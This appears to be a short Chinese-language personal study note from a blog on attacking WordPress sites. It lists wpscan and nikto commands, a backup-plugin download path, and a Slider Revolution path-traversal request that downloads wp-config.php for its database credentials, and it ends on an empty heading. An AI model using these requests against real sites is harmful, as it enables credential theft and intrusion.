---
title: WordPress
date: 2019-11-08 19:09:36
categories:
- CypherSecurity
- 2016
tags:
- CypherSecurity
- 2016
---

# WordPress漏洞利用  

## 学习链接

> - WordPress插件注入漏洞 [EXPLOIT-DATABASE](https://www.exploit-db.com/exploits/36613/)  
> - [FREEBUF](http://www.freebuf.com/articles/web/65894.html)

## WPScan的利用

> - 命令  wpscan -url URL



## nikto的利用

> - 命令  nikto  -h   URL  
> - 可以通过一些cookies查看是否为WordPress站点，用于验证是否为WordPress站点


## Backup组件下载漏洞

> - 路径: wp-content/wpbackitup_backups/


## Slider Revolution Plugin 任意文件下载漏洞

> - 路径: wp-admin/admin-ajax.php?action=revslider_show_image&img=文件名  
> - 例如: wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php
> - 可以下载当前目录下的任意文件(路径首先正确),特别地，当拿到wp-config文件后就bam!bam!bam!

## Complete Gallery Manager 3.3.3任意文件上传漏洞

